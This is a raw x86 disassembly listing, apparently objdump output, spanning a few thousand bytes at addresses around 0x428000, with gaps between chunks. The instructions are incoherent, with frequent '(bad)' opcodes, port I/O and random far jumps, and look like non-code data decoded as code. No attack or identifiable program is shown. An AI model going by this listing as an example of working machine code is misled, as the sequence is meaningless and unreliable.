  4280ac:	lods   al,BYTE PTR ds:[esi]
  4280ad:	inc    ebx
  4280ae:	xchg   ebx,eax
  4280b0:	mov    esi,0x8474f219
  4280b5:	stc    
  4280b6:	dec    ecx
  4280b7:	call   0x99ea0490
  4280bc:	addr16 push esp
  4280be:	loope  0x42813b
  4280c0:	xor    DWORD PTR [edx+0x221cc359],esp
  4280c6:	ds call 0x6c58:0xe75cfa9f
  4280ce:	add    ah,BYTE PTR [edi-0x315ff379]
  4280d4:	or     BYTE PTR [ebx],bl
  4280d6:	push   0xcfbb3cef
  4280db:	bound  ecx,QWORD PTR [edx]
  4280dd:	mov    BYTE PTR [edi-0x2aa5d3ad],dl
  4280e3:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  4280e5:	mov    ch,BYTE PTR [esi+0x46]
  4280e8:	pop    ebx
  4280e9:	mov    dh,0xc2
  4280eb:	test   BYTE PTR [esi+0x12],dl
  4280ee:	in     al,dx
  4280ef:	cmp    eax,0xe0e24cb3
  4280f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4280f5:	mov    ch,0x5a
  4280f7:	mov    cl,0x82
  4280f9:	pop    ds
  4280fa:	sbb    edx,0xffffff8a
  4280fd:	sahf   
  4280fe:	aas    
  4280ff:	pop    ss
  428100:	adc    al,0x1d
  428102:	cmp    al,0xf1
  428104:	je     0x42810a
  428106:	in     al,0x91
  428108:	mov    BYTE PTR [eax+0x4d],dh
  42810b:	popa   
  42810c:	dec    ecx
  42810d:	repz xchg edi,ebx
  428110:	adc    eax,0xf026ff02
  428115:	ins    DWORD PTR es:[edi],dx
  428116:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  428118:	xchg   ecx,eax
  428119:	jl     0x42811f
  42811b:	jno    0x4280e1
  42811d:	enter  0x7a1,0xfc
  428121:	inc    edi
  428122:	out    dx,eax
  428123:	ret    
  428124:	sub    dh,BYTE PTR [esp+edx*4+0x7]
  428128:	push   edi
  428129:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42812a:	or     DWORD PTR [ebp-0x64],esi
  42812d:	lods   eax,DWORD PTR ds:[esi]
  42812e:	mov    eax,ds:0xa78f5dc3
  428133:	stos   BYTE PTR es:[edi],al
  428134:	inc    eax
  428135:	rcl    ecx,0x2c
  428138:	imul   esi,DWORD PTR [ebp+0x51],0xdbd4ff1c
  42813f:	jnp    0x428179
  428141:	daa    
  428142:	inc    edx
  428143:	icebp  
  428144:	pop    eax
  428145:	scas   eax,DWORD PTR es:[edi]
  428146:	xor    BYTE PTR [edi-0x66],ah
  428149:	cmp    ch,cl
  42814b:	pusha  
  42814c:	popf   
  42814d:	mov    ebp,0xc524d9d6
  428152:	adc    ecx,ecx
  428154:	jb     0x4281a4
  428156:	push   edi
  428157:	addr16 inc esi
  428159:	cmp    edx,esi
  42815b:	mov    cl,BYTE PTR [ebp-0x2ba1fc00]
  428161:	pop    esp
  428162:	gs jb  0x4281a1
  428165:	dec    ebx
  428166:	xor    al,0xba
  428168:	mov    WORD PTR [ebp-0x4e],ss
  42816b:	mov    es,WORD PTR [edx+ecx*4+0x0]
	...
  4281d6:	fucomip st,st(6)
  4281d8:	std    
  4281d9:	dec    esp
  4281da:	std    
  4281db:	pop    edi
  4281dc:	(bad)  
  4281dd:	call   FWORD PTR [edx]
  4281df:	xchg   edi,eax
  4281e0:	pop    esp
  4281e1:	push   ecx
  4281e2:	xchg   ebx,eax
  4281e3:	xlat   BYTE PTR ds:[ebx]
  4281e4:	ret    0x67b5
  4281e7:	scas   al,BYTE PTR es:[edi]
  4281e8:	add    DWORD PTR [eax],eax
  4281ea:	add    BYTE PTR [ecx],al
  4281ec:	add    BYTE PTR [eax],al
  4281ee:	rol    BYTE PTR [eax],cl
  4281f0:	jmp    0x428215
  4281f2:	inc    ebp
  4281f3:	test   eax,0xd779073f
  4281f8:	sbb    ebx,DWORD PTR [ebx+0x72]
  4281fb:	je     0x428185
  4281fd:	pop    edi
  4281fe:	xchg   esi,eax
  4281ff:	cmp    BYTE PTR [esi+0x17613ba4],ah
  428205:	jg     0x4281e9
  428207:	xor    eax,0x21c87e05
  42820c:	test   DWORD PTR [ebp+0x44d2166b],ebx
  428212:	ins    DWORD PTR es:[edi],dx
  428213:	addr16 daa 
  428215:	aas    
  428216:	sti    
  428217:	push   cs
  428218:	mov    eax,0xe776a292
  42821d:	hlt    
  42821e:	add    dh,al
  428220:	inc    ecx
  428221:	in     al,0x57
  428223:	rcr    DWORD PTR [edi+0x1aa30373],1
  428229:	sub    ah,dl
  42822b:	or     eax,0xcd5aba09
  428230:	and    esp,ecx
  428232:	push   eax
  428233:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428234:	jno    0x428261
  428236:	push   esi
  428237:	adc    al,0xa8
  428239:	mov    WORD PTR [ebx],?
  42823b:	int3   
  42823c:	push   ds
  42823d:	mov    cl,ch
  42823f:	cs pop esi
  428241:	add    esi,DWORD PTR [edx+0x64958f45]
  428247:	ret    
  428248:	and    al,0x5
  42824a:	in     eax,dx
  42824b:	in     eax,dx
  42824c:	mov    ecx,0xc0b30a35
  428251:	sar    ecx,cl
  428253:	loopne 0x42825b
  428255:	mov    edi,0x3083e8f6
  42825a:	pop    eax
  42825b:	popa   
  42825c:	and    DWORD PTR [edx+ecx*1+0x4f],edi
  428260:	imul   ebx,DWORD PTR [ecx],0x93a3f05b
  428266:	cmp    eax,0x3a5cece5
  42826b:	pop    ecx
  42826c:	xchg   ecx,eax
  42826d:	mov    bh,0xfc
  42826f:	cmp    eax,0x3a4cf512
  428274:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428275:	rcl    ebp,0xf8
  428278:	sub    BYTE PTR [edi+0x7c45bea7],cl
  42827e:	dec    ebp
  42827f:	jp     0x4282c8
  428281:	lock lods al,BYTE PTR ds:[esi]
  428283:	out    dx,al
  428284:	fadd   st,st(0)
  428286:	ret    
  428287:	xchg   ebx,eax
  428288:	repnz sti 
  42828a:	xor    al,0x9d
  42828c:	pop    edx
  42828d:	jp     0x428234
  42828f:	out    0x90,al
  428291:	aas    
  428292:	pop    edi
  428293:	mov    edx,0x2dc36d46
  428298:	mov    esi,0x56e931d4
  42829d:	jg     0x4282dc
  42829f:	jns    0x428262
  4282a1:	sub    BYTE PTR [edx+0x25cdab8b],cl
  4282a7:	int3   
  4282a8:	or     DWORD PTR [esi-0xc294d16],edx
  4282ae:	mov    eax,0x38e7e098
  4282b3:	(bad)  
  4282b4:	mov    cl,0x73
  4282b6:	jge    0x428324
  4282b8:	xor    DWORD PTR [edx+0x66eab892],0xffffffba
  4282bf:	sub    BYTE PTR ds:0x955c87e3,ch
  4282c5:	inc    esp
  4282c6:	sbb    ecx,DWORD PTR [edx]
  4282c8:	sub    eax,DWORD PTR [edi-0x2b3bafe9]
  4282ce:	shr    BYTE PTR [edi-0x44a97983],0xf7
  4282d5:	out    0x85,eax
  4282d7:	mov    cl,0xb7
  4282d9:	add    ch,BYTE PTR ds:0xa46460fe
  4282df:	(bad)  
  4282e0:	mov    eax,ds:0xf942541
  4282e5:	mov    edi,0x15be8fad
  4282ea:	jecxz  0x428300
  4282ec:	and    cl,BYTE PTR [edi]
	...
  428356:	(bad)  
  428357:	fidiv  WORD PTR [esi]
  428359:	loop   0x42839a
  42835b:	jmp    0x5c37:0x7b70ffd7
  428362:	cmp    eax,0x67c830a4
  428367:	scas   eax,DWORD PTR es:[edi]
  428368:	add    DWORD PTR [eax],eax
  42836a:	add    BYTE PTR [ecx],al
  42836c:	add    BYTE PTR [eax],al
  42836e:	loopne 0x4283d2
  428370:	mov    esi,0x8b844127
  428375:	mov    al,0x88
  428377:	xchg   BYTE PTR [esi+ecx*4],dh
  42837a:	pop    ebx
  42837b:	test   al,0xc
  42837d:	sub    BYTE PTR [ebp+0x74f5ba39],0x2f
  428384:	stc    
  428385:	or     DWORD PTR [ebx+eiz*1+0x2],edi
  428389:	sbb    al,BYTE PTR ds:0xabec750
  42838f:	sti    
  428390:	push   ss
  428391:	in     al,dx
  428392:	dec    eax
  428393:	mov    edx,0x41fe4773
  428398:	jne    0x42834e
  42839a:	pusha  
  42839b:	inc    ebx
  42839c:	mov    ds:0x4ca4f1d2,al
  4283a1:	js     0x4283c7
  4283a3:	repz bound ebx,QWORD PTR [esi+eiz*2-0x2daca3d4]
  4283ab:	sub    eax,DWORD PTR ds:0xbc37a91b
  4283b1:	aas    
  4283b2:	loop   0x4283f6
  4283b4:	out    0xf1,al
  4283b6:	sbb    al,0xe3
  4283b8:	lds    edi,FWORD PTR [edi+0x26]
  4283bb:	mov    ah,0xa7
  4283bd:	jae    0x428372
  4283bf:	retf   
  4283c0:	or     eax,0x86f0c0e9
  4283c5:	mov    al,ds:0x1e7c716b
  4283ca:	adc    dh,ch
  4283cc:	or     edx,DWORD PTR [ebx-0x38]
  4283cf:	ins    BYTE PTR es:[edi],dx
  4283d0:	dec    ebp
  4283d1:	jmp    0x428426
  4283d3:	vpsllq ymm0,ymm2,XMMWORD PTR [eax-0x1bf24a24]
  4283db:	xor    DWORD PTR [ebx-0x7],0x2cf5b2b5
  4283e2:	(bad)  
  4283e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283e4:	xchg   ebx,eax
  4283e5:	or     dl,cl
  4283e7:	dec    edx
  4283e8:	mov    eax,0x936781cb
  4283ed:	add    BYTE PTR [ebx],0xc
  4283f0:	aam    0xa3
  4283f2:	frstor [ebx+0x6e29f98a]
  4283f8:	mov    ebx,0x508ce14c
  4283fd:	repz retf 
  4283ff:	inc    esi
  428400:	hlt    
  428401:	jbe    0x428412
  428403:	dec    ebp
  428404:	loopne 0x42841e
  428406:	shl    DWORD PTR [ecx],0xd6
  428409:	and    ah,cl
  42840b:	fs jmp 0x3c16:0xe3ddddd5
  428413:	jl     0x4283b0
  428415:	or     edx,DWORD PTR [eax-0x1cd285fa]
  42841b:	enter  0x37ef,0x73
  42841f:	xchg   BYTE PTR [ebx],dl
  428421:	sbb    bh,BYTE PTR [ecx+0xbdcd2d9]
  428427:	fstp   TBYTE PTR [ebx+0x54]
  42842a:	and    eax,0x9c868cc
  42842f:	inc    edi
  428430:	sbb    ebp,DWORD PTR [edi-0x6f]
  428433:	xor    dh,dh
  428435:	shl    DWORD PTR [edi+ebx*4-0x4f2a4475],1
  42843c:	lods   eax,DWORD PTR ds:[esi]
  42843d:	and    cl,BYTE PTR [eax]
  42843f:	es fs aas 
  428442:	xor    DWORD PTR ds:0x16ac9f0c,ecx
  428448:	pop    esi
  428449:	dec    ebx
  42844a:	push   edx
  42844b:	and    al,0xd5
  42844d:	out    0x9b,al
  42844f:	mov    DWORD PTR [esi+0x78],edi
  428452:	push   0x75d95005
  428457:	outs   dx,BYTE PTR ds:[esi]
  428458:	mov    dh,0x93
  42845a:	adc    DWORD PTR [edi+0x1daaf4d6],esi
  428460:	pop    ebx
  428461:	mov    cl,0x10
  428463:	jp     0x428475
  428465:	imul   ebx,DWORD PTR [bx],0xffffff9f
  428469:	aad    0xe3
  42846b:	mov    esp,DWORD PTR [eax+0x53]
	...
  4284d6:	push   cs
  4284d7:	xchg   esp,eax
  4284d8:	jg     0x42853d
  4284da:	(bad)  
  4284db:	jmp    0x4284fb
  4284dd:	std    
  4284de:	mov    edi,0xd6abfb32
  4284e3:	sub    bh,BYTE PTR ds:0x1b06739
  4284e9:	add    BYTE PTR [eax],al
  4284eb:	add    DWORD PTR [eax],eax
  4284ed:	add    BYTE PTR [edx+0x4c],cl
  4284f0:	xor    DWORD PTR [esi-0x8],edi
  4284f3:	mov    ds:0xc3a8e6d2,eax
  4284f8:	sbb    al,0x25
  4284fa:	sbb    ecx,DWORD PTR [esi]
  4284fc:	adc    ah,BYTE PTR [ebx-0x50418b63]
  428502:	pop    esp
  428503:	jmp    DWORD PTR [ebp+0x545d5afa]
  428509:	scas   al,BYTE PTR es:[edi]
  42850a:	data16 sar BYTE PTR [eax+0x4ee9fb22],0x8c
  428512:	add    DWORD PTR [edi-0x51],esp
  428515:	pop    edx
  428516:	inc    esi
  428517:	adc    BYTE PTR ds:0x1e448638,bh
  42851d:	retf   
  42851e:	retf   0x34ad
  428521:	inc    edi
  428522:	xchg   BYTE PTR [ebp-0x61aea08d],al
  428528:	xor    DWORD PTR [ebx-0x626c234b],esi
  42852e:	outs   dx,BYTE PTR ds:[esi]
  42852f:	sbb    BYTE PTR [edi+0x545bfb20],ah
  428535:	retf   0x935d
  428538:	pop    ecx
  428539:	popa   
  42853a:	xchg   ebp,eax
  42853b:	add    BYTE PTR [esi+0x5cb18e37],al
  428541:	sub    eax,0xc44d7ed7
  428546:	pop    es
  428547:	sahf   
  428548:	loope  0x4284d4
  42854a:	or     esp,DWORD PTR [edx+0x1]
  42854d:	jnp    0x428524
  42854f:	nop
  428550:	push   eax
  428551:	clc    
  428552:	push   esi
  428553:	add    DWORD PTR [esi+0x1de30a04],ecx
  428559:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42855a:	(bad)  [ecx]
  42855c:	bound  edx,QWORD PTR [ebx+0x3b]
  42855f:	sbb    esp,DWORD PTR [eax+0x17]
  428562:	(bad)  
  428563:	xor    al,0x16
  428565:	jbe    0x428522
  428567:	div    BYTE PTR [edi+ecx*1+0x16ef71a3]
  42856e:	neg    esp
  428570:	sbb    eax,0x12851294
  428575:	jne    0x428513
  428577:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428578:	or     BYTE PTR [esi-0x2f5d7cba],dh
  42857e:	sar    DWORD PTR [ebx],1
  428580:	pusha  
  428581:	xchg   edx,eax
  428582:	and    edi,DWORD PTR [ecx]
  428584:	(bad)  
  428585:	fcomp  DWORD PTR [eax+0x3da71bb7]
  42858b:	add    BYTE PTR [eax+0x68f74bb],0x6c
  428592:	ins    DWORD PTR es:[edi],dx
  428593:	mov    ecx,0xb69bac6a
  428598:	mov    WORD PTR [esi+0x349eecbe],ds
  42859e:	push   cs
  42859f:	dec    ebp
  4285a0:	pop    esi
  4285a1:	dec    ebp
  4285a2:	shl    BYTE PTR [eax],1
  4285a4:	dec    ecx
  4285a5:	sbb    BYTE PTR [ecx+0x2ae78d23],ah
  4285ab:	rol    BYTE PTR [edx-0x7],1
  4285ae:	lea    edx,[edi+0x1a]
  4285b1:	call   0x8ad6:0xa817def0
  4285b8:	mov    edx,0xd35c67ba
  4285bd:	pop    es
  4285be:	je     0x428551
  4285c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4285c1:	sbb    eax,0x5c536be8
  4285c6:	sbb    eax,0xe60cea0b
  4285cb:	cmp    ah,bl
  4285cd:	add    dl,ah
  4285cf:	mov    esi,0x6d66616b
  4285d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4285d5:	push   edi
  4285d6:	(bad)  
  4285d7:	push   edi
  4285d8:	dec    ebx
  4285d9:	push   ebx
  4285da:	push   0x7c088edd
  4285df:	nop
  4285e0:	mov    ecx,0x9aae1643
  4285e5:	jg     0x428625
  4285e7:	pop    eax
  4285e8:	sbb    al,BYTE PTR [esi]
  4285ea:	xchg   ebp,eax
  4285eb:	cmp    eax,0xae80
	...
  428654:	add    BYTE PTR [eax],al
  428656:	push   ecx
  428657:	div    BYTE PTR ds:0x5bffb73e
  42865d:	inc    edi
  42865f:	mov    esi,0x1a64a3f6
  428664:	xchg   ebp,eax
  428665:	xor    DWORD PTR [edi-0x4f],esp
  428668:	add    DWORD PTR [eax],eax
  42866a:	add    BYTE PTR [ecx],al
  42866c:	add    BYTE PTR [eax],al
  42866e:	inc    eax
  42866f:	aam    0x4c
  428671:	addr16 bnd call 0xeedf896
  428678:	or     al,0xa5
  42867a:	mov    ds:0xa31adc3f,al
  42867f:	sub    al,0xa4
  428681:	out    0x6,al
  428683:	mov    bh,0x5b
  428685:	mov    ah,0x58
  428687:	cs (bad) 
  428689:	fld    DWORD PTR [ebx]
  42868b:	cwde   
  42868c:	cmp    al,al
  42868e:	loopne 0x4286e2
  428690:	ficom  DWORD PTR [edx-0x61d5b4fe]
  428696:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428697:	jl     0x428659
  428699:	ror    DWORD PTR [eax-0x8],0x9
  42869d:	xchg   BYTE PTR [ebx+0x1a83b15b],bh
  4286a3:	cmp    ebp,0xffffff8e
  4286a6:	sbb    al,0x5a
  4286a8:	push   edi
  4286a9:	pop    ss
  4286aa:	cli    
  4286ab:	and    eax,0xfecc2438
  4286b0:	xchg   ebp,eax
  4286b1:	loope  0x42864d
  4286b3:	jp     0x428688
  4286b5:	mov    bh,BYTE PTR [ebx+0x2a]
  4286b8:	cmp    BYTE PTR [eax-0x2e],bh
  4286bb:	sub    al,0x60
  4286bd:	fs xchg ebp,eax
  4286bf:	sbb    DWORD PTR [edi],ebx
  4286c1:	popf   
  4286c2:	int3   
  4286c3:	sub    eax,0xe7e403ec
  4286c8:	sub    eax,0x35dcf8c5
  4286cd:	or     eax,0x23285a23
  4286d2:	sub    al,0x3
  4286d4:	fdiv   QWORD PTR [esi+0x21240d6e]
  4286da:	push   es
  4286db:	comiss xmm4,xmm6
  4286de:	jecxz  0x4286e2
  4286e0:	test   BYTE PTR [ecx],dh
  4286e2:	imul   ebp,DWORD PTR [ecx],0x31422e2f
  4286e8:	or     edx,ebp
  4286ea:	ds inc ebp
  4286ec:	mov    al,ds:0xb3df3896
  4286f1:	dec    ebx
  4286f2:	inc    ebx
  4286f3:	rsqrtps xmm4,XMMWORD PTR ds:0xffd7
  4286f9:	mov    ecx,0x3ab804a2
  4286fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4286ff:	cmp    DWORD PTR [edi],esi
  428701:	idiv   BYTE PTR [esi-0x36]
  428704:	dec    esp
  428705:	sbb    al,0xe1
  428707:	stos   BYTE PTR es:[edi],al
  428708:	adc    eax,0xcb52f4a
  42870d:	sub    al,ch
  42870f:	mov    ds:0x5535190e,eax
  428714:	push   es
  428715:	stos   DWORD PTR es:[edi],eax
  428716:	push   ss
  428717:	adc    DWORD PTR [esi+0x485e8998],0x37a202e
  428721:	dec    ebx
  428722:	xchg   esi,eax
  428723:	mov    BYTE PTR [ebp+0x39baf9dc],cl
  428729:	das    
  42872a:	or     BYTE PTR [ebx+0x2b6aa0a1],al
  428730:	xchg   ecx,eax
  428731:	scas   eax,DWORD PTR es:[edi]
  428732:	add    cl,BYTE PTR [eax+0x7cfdae75]
  428738:	mov    ds:0xa1b28e87,eax
  42873d:	pop    es
  42873e:	and    eax,0x5fe2180d
  428743:	in     al,dx
  428744:	nop
  428745:	scas   eax,DWORD PTR es:[edi]
  428746:	test   eax,0xf083a458
  42874b:	sbb    BYTE PTR [edi-0x561cfda3],bl
  428751:	pop    esp
  428752:	int3   
  428753:	sbb    esp,DWORD PTR [esi]
  428755:	retf   0x355d
  428758:	add    BYTE PTR [ecx+0x44],ah
  42875b:	sbb    eax,0xca3a53fb
  428760:	adc    al,0x81
  428762:	lds    eax,FWORD PTR ds:0xdc003c04
  428768:	addr16 pop edi
  42876a:	dec    esi
  42876b:	aaa    
  42876c:	pop    ds
  42876d:	pop    eax
	...
  4287d6:	push   esi
  4287d7:	pop    ebx
  4287d8:	xor    al,0x78
  4287da:	cmp    eax,0xe77f5e7f
  4287df:	inc    ebp
  4287e0:	call   0xbf276ef8
  4287e5:	aaa    
  4287e6:	addr16 mov dl,0x1
  4287e9:	add    BYTE PTR [eax],al
  4287eb:	add    DWORD PTR [eax],eax
  4287ed:	add    BYTE PTR [ecx],dl
  4287ef:	jmp    FWORD PTR [esp+edx*1+0x57d083f7]
  4287f6:	xor    DWORD PTR [eax-0x156f246e],edi
  4287fc:	jg     0x4287c7
  4287fe:	cmc    
  4287ff:	push   ebx
  428800:	cwde   
  428801:	scas   eax,DWORD PTR es:[edi]
  428802:	pop    es
  428803:	loope  0x42883b
  428805:	pop    ss
  428806:	loopne 0x428788
  428808:	div    bl
  42880a:	div    BYTE PTR [edx+0x5a]
  42880d:	outs   dx,BYTE PTR ds:[esi]
  42880e:	adc    eax,0x9b25aebc
  428813:	lods   eax,DWORD PTR ds:[esi]
  428814:	push   0x9f6f4d96
  428819:	mov    ds,esp
  42881b:	dec    edx
  42881c:	add    eax,0x880be2a1
  428821:	mov    BYTE PTR [esp+ebp*8],cl
  428824:	shl    BYTE PTR [ebx-0x3c],1
  428827:	mov    ch,0xe8
  428829:	loopne 0x42883b
  42882b:	retf   0xed3a
  42882e:	mov    eax,ebp
  428830:	mov    edx,0x29a0c0f4
  428835:	pusha  
  428836:	mov    dl,BYTE PTR [ebx-0x20]
  428839:	cmp    al,dl
  42883b:	daa    
  42883c:	pop    esi
  42883d:	aam    0x3b
  42883f:	mov    edi,DWORD PTR [ecx-0x12]
  428842:	xchg   esi,eax
  428843:	adc    DWORD PTR [eax],eax
  428845:	xlat   BYTE PTR ds:[ebx]
  428846:	aad    0x72
  428848:	mov    es,WORD PTR [eax+0x32]
  42884b:	dec    edi
  42884c:	shl    bl,0xde
  42884f:	pop    esp
  428850:	lods   eax,DWORD PTR ds:[esi]
  428851:	cmp    BYTE PTR fs:[esi+0x5e],al
  428855:	cmp    dh,bl
  428857:	out    0x4,eax
  428859:	int3   
  42885a:	inc    edx
  42885b:	popf   
  42885c:	xchg   edi,eax
  42885d:	and    BYTE PTR [edi],cl
  42885f:	lea    ecx,[eax+0x67bfc731]
  428865:	mov    eax,DWORD PTR [ebx+0x18dcf34e]
  42886b:	fsubr  QWORD PTR ds:0x99d0e4b3
  428871:	xchg   ecx,eax
  428872:	(bad)  
  428873:	fadd   QWORD PTR [esi-0x234993a]
  428879:	in     eax,0x71
  42887b:	idiv   eax
  42887d:	call   0xb9fcb50c
  428882:	mov    eax,ds:0x99fbb6bb
  428887:	or     al,0x63
  428889:	imul   eax,DWORD PTR [esi-0x16075bfa],0x61d454c1
  428893:	outs   dx,BYTE PTR ds:[esi]
  428894:	jns    0x4288fc
  428896:	retf   0xcc7b
  428899:	iret   
  42889a:	retw   
  42889c:	add    BYTE PTR [ebp+0x2e07060d],0x9b
  4288a3:	aaa    
  4288a4:	fist   DWORD PTR [edi-0x3d]
  4288a7:	pushf  
  4288a8:	pop    ss
  4288a9:	icebp  
  4288aa:	loop   0x42884b
  4288ac:	dec    edx
  4288ad:	mov    bl,0xc0
  4288af:	sbb    al,0xf2
  4288b1:	sbb    eax,DWORD PTR [edi]
  4288b3:	xchg   esi,eax
  4288b4:	mov    edi,0x8a5f97f8
  4288b9:	mov    ds:0x3655494b,al
  4288be:	mov    edi,0x63b0786d
  4288c3:	mov    ch,0x4
  4288c5:	repnz and BYTE PTR [eax+0x3f3d4f64],bh
  4288cc:	xor    edi,ebp
  4288ce:	mov    bl,0xb3
  4288d0:	mov    eax,ds:0xcf9a0f02
  4288d5:	enter  0xb409,0x9c
  4288d9:	pop    eax
  4288da:	test   al,0xb1
  4288dc:	(bad)  
  4288dd:	(bad)  
  4288de:	repz ror DWORD PTR ds:0xaee11b4e,1
  4288e5:	jl     0x428874
  4288e7:	dec    edx
  4288e8:	mov    es,WORD PTR [edx-0x789c0de0]
	...
  428956:	es jp  0x4289ca
  428959:	les    edi,FWORD PTR [ebp-0x31]
  42895c:	mov    bh,0xfa
  42895e:	arpl   WORD PTR [esi+0x24ba9d0f],bx
  428964:	fisttp DWORD PTR [edx]
  428966:	addr16 mov bl,0x1
  428969:	add    BYTE PTR [eax],al
  42896b:	add    DWORD PTR [eax],eax
  42896d:	add    BYTE PTR [eax+0x7f29416e],bh
  428973:	cld    
  428974:	push   esp
  428975:	jno    0x428994
  428977:	xor    DWORD PTR [ebp+0x572602cd],ebp
  42897d:	(bad)  
  42897e:	(bad)  
  42897f:	aas    
  428980:	push   ebx
  428981:	mov    ebx,0xad41617
  428986:	outs   dx,BYTE PTR ds:[esi]
  428987:	or     ah,BYTE PTR [edx+0x677fce19]
  42898d:	scas   eax,DWORD PTR es:[edi]
  42898e:	test   DWORD PTR [ebx-0x10fa7f39],ebp
  428994:	jle    0x428943
  428996:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428997:	mov    ecx,0x8c2a16b9
  42899c:	fwait
  42899d:	das    
  42899e:	shr    cl,1
  4289a0:	add    al,0xc8
  4289a2:	fsubp  st(3),st
  4289a4:	and    ecx,DWORD PTR [edx+eiz*2+0xf]
  4289a8:	pop    ebp
  4289a9:	add    al,0xf6
  4289ab:	sbb    bl,al
  4289ad:	lds    ebx,FWORD PTR [ecx]
  4289af:	adc    ebp,DWORD PTR [ebp+0xa3b19dc]
  4289b5:	cmp    BYTE PTR [edi+0x5],0xad
  4289b9:	xchg   esp,eax
  4289ba:	adc    ah,dl
  4289bc:	sbb    DWORD PTR [esi],0x37fb2c37
  4289c2:	or     al,0xcf
  4289c4:	inc    DWORD PTR [ecx]
  4289c6:	jg     0x428a21
  4289c8:	stc    
  4289c9:	sahf   
  4289ca:	imul   ebp,DWORD PTR [edx+0x5e219a4d],0xf95b2e4d
  4289d4:	sbb    eax,0xe3ef964
  4289d9:	or     BYTE PTR [ecx],0x5a
  4289dc:	or     BYTE PTR [ecx],ch
  4289de:	pop    cx
  4289e0:	add    eax,0xcd0dcbfd
  4289e5:	or     BYTE PTR [ecx+0x47],0x22
  4289e9:	cmc    
  4289ea:	(bad)  
  4289eb:	mov    ds:0x8fc6c354,eax
  4289f0:	adc    ebp,DWORD PTR [eax-0x60]
  4289f3:	mov    cl,0xcd
  4289f5:	push   ebp
  4289f6:	jns    0x428a34
  4289f8:	outs   dx,DWORD PTR ds:[esi]
  4289f9:	rcl    BYTE PTR [edi-0x7c],1
  4289fc:	push   ecx
  4289fd:	fcmovnu st,st(2)
  4289ff:	int    0x3d
  428a01:	sub    ecx,DWORD PTR cs:[eax-0x35f589fd]
  428a08:	adc    dh,BYTE PTR [ebx+edi*2]
  428a0b:	and    ah,cl
  428a0d:	jo     0x4289d0
  428a0f:	ficomp DWORD PTR [ebp-0x142a9cf8]
  428a15:	jbe    0x4289ab
  428a17:	adc    DWORD PTR [ebp-0x79],esi
  428a1a:	popf   
  428a1b:	sbb    ah,BYTE PTR [edx-0x73]
  428a1e:	(bad)  
  428a1f:	dec    esp
  428a20:	es out dx,al
  428a22:	sbb    al,0xe1
  428a24:	sub    DWORD PTR [ecx+edi*1+0x13fd2982],esi
  428a2b:	cmp    DWORD PTR [ecx],0x11
  428a2e:	adc    ebx,eax
  428a30:	in     al,dx
  428a31:	mov    eax,0x5980c049
  428a36:	repz jae 0x428a83
  428a39:	adc    eax,0x57ee273f
  428a3e:	in     al,0x55
  428a40:	mov    bl,0xa
  428a42:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  428a44:	jne    0x428a81
  428a46:	jg     0x428ab3
  428a48:	push   0xffffffa1
  428a4a:	add    DWORD PTR [ecx],eax
  428a4c:	stos   DWORD PTR es:[edi],eax
  428a4d:	mov    al,0xa5
  428a4f:	mov    ss,WORD PTR [ecx]
  428a51:	xlat   BYTE PTR ds:[ebx]
  428a52:	lea    ebp,[esi-0x74e588f8]
  428a58:	xchg   edi,eax
  428a59:	inc    edi
  428a5a:	rcl    dl,cl
  428a5c:	cs push ds
  428a5e:	adc    DWORD PTR es:[eax+0x52],edx
  428a62:	xchg   edx,eax
  428a63:	mov    ?,WORD PTR ds:0x3fb658b2
  428a69:	call   0x0:0x67af7a1e
	...
  428ad4:	add    BYTE PTR [eax],al
  428ad6:	dec    ebp
  428ad7:	or     al,0xf8
  428ad9:	pop    ebx
  428ada:	stc    
  428adb:	(bad)  
  428adc:	out    dx,eax
  428add:	push   ds
  428ade:	pop    ds
  428adf:	bound  edx,QWORD PTR [eax-0x34b10ed]
  428ae5:	packuswb mm6,QWORD PTR [ecx+eax*1+0x10000]
  428aed:	add    BYTE PTR [edx+0x28],ch
  428af0:	(bad)  [ebp+0x1ed6f8ea]
  428af6:	imul   esp,DWORD PTR [ecx-0x11],0x9
  428afa:	dec    edx
  428afb:	enter  0xd24d,0x69
  428aff:	xchg   DWORD PTR [edx],ebx
  428b01:	leave  
  428b02:	jb     0x428afc
  428b04:	xlat   BYTE PTR ds:[ebx]
  428b05:	sbb    DWORD PTR [esi-0x21],edi
  428b08:	mov    ch,0xf3
  428b0a:	xor    BYTE PTR [edx-0x5e0818a],cl
  428b10:	fcom   QWORD PTR [ecx]
  428b12:	xor    cl,dh
  428b14:	je     0x428ad8
  428b16:	ja     0x428abb
  428b18:	sub    BYTE PTR [eax],ch
  428b1a:	ror    BYTE PTR [edi+ecx*4],1
  428b1d:	iret   
  428b1e:	xchg   ebp,eax
  428b1f:	cwde   
  428b20:	push   cs
  428b21:	adc    edx,DWORD PTR [edi]
  428b23:	xchg   DWORD PTR [ebx],ebp
  428b25:	jle    0x428adf
  428b27:	jns    0x428b00
  428b29:	(bad)
  428b2d:	cmp    eax,0xbe721544
  428b32:	in     al,dx
  428b33:	mov    edx,0xfb7e0357
  428b38:	add    BYTE PTR [edx+0x7c],cl
  428b3b:	shr    cl,1
  428b3d:	inc    eax
  428b3e:	sub    eax,0x6f7bcb93
  428b43:	pop    ebx
  428b44:	in     al,0x47
  428b46:	pop    edx
  428b47:	jmp    0x428b4d
  428b49:	push   edi
  428b4a:	mov    ah,0x8
  428b4c:	or     al,cl
  428b4e:	mov    ah,0x4e
  428b50:	and    edx,DWORD PTR [ebp+0x2bb455ca]
  428b56:	lds    eax,FWORD PTR [ebp-0x4e6b17a6]
  428b5c:	dec    esi
  428b5d:	sbb    al,0xd7
  428b5f:	scas   eax,DWORD PTR es:[edi]
  428b60:	mov    ebp,0xefbdf2b5
  428b65:	leave  
  428b66:	cmp    ch,BYTE PTR [ecx]
